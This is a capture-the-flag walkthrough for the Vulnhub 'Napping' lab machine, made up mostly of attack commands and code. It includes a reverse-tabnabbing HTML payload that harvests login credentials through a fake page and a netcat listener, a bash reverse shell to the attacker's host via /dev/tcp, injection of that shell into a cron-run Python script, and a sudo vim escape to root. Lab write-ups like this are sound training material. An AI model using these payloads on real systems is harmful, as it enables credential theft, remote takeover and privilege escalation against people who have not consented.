Vulnhub - Napping: 1.0.1 Walkthrough

Youtube Video Walkthrough link: https://www.youtube.com/watch?v=L-WyKMibkZk&list=PL_Bj4ZvhLa37QWivDC6chQTanrxqdjWrh&index=7&t=852s

Let's start by getting the IP address of the machine
$sudo arp-scan -l

$nmap -sC -sV -p- <ip_vulnerablemachine>
there are two ports open 80, 22

go to the page http://<ip_vulnerablemachine
try to register to the website

so you will get the text box to upload the link
check the page source, check the vulnerability for 'target'

create a file 

vfile.html

<html>
<script>
	if (window.opener) window.opener.parent.location.replace("http://<ip_kalilinux:8000/index.html");
	if (window.parent != window) window.opener.parent.location.replace("http://<ip_kalilinux:8000/index.html");
</script>
</script>
</html>

create another file index.html, copy the login page here

host these files from the kali machine
$python3 -m http.server 80

now go to the website of the vulnerable machine, put the ip address of the kali machine and upload the file

http://<ip_kalilinux>:80/vfile.html

use netcat
$nc -lvnp 8000

wait for a minute or so it will take some time
you will get back the username and password
the password is url encoded, so you can use burpsuite to decode that

ssh to the username
$ssh danier@<ip_vulnerablemachine>

$id
$sudo -l
$groups
you will be able to see another user

check what files you can run
$find / -group administrators -type f 2>/dev/null

you will be able to run the file
/home/adrian/query.py

$ls -l /home/adrian/query.py

$cd /dev/shm

create a file revshell.sh

and now check bash reverse shell from payload all the things

#!/bin/bash
bash -i >& /dev/tcp/<ip_kalimachine>/4444 0>&1

$chmod +x revshell.sh

$cd /home/adrian

if you check the site status - it will check every two minutes

you can also check the query.py that updates the status

now you can modify this file

you can erase and update the file
$echo "" > query.py

vi query.py

import os
os.system('/usr/bin/bash /dev/shm/revshell.sh')


now you run the file, and also do a netcat

$nc -lvnp 4444

upi will get the shell after running the file

now spawn the shell
$python3 -c 'import pty; pty.spawn("/bin/bash")'

$ stty raw -echo;fg

$export TERM=xterm
$groups
$sudo -l

you will see you can run vim

you can see the user flag

you can exploit vim's vulnerability

$sudo /usr/bin/vim -c ':!/bin/sh' 

you will get the root, and you will be able to get the root flag in the root directory
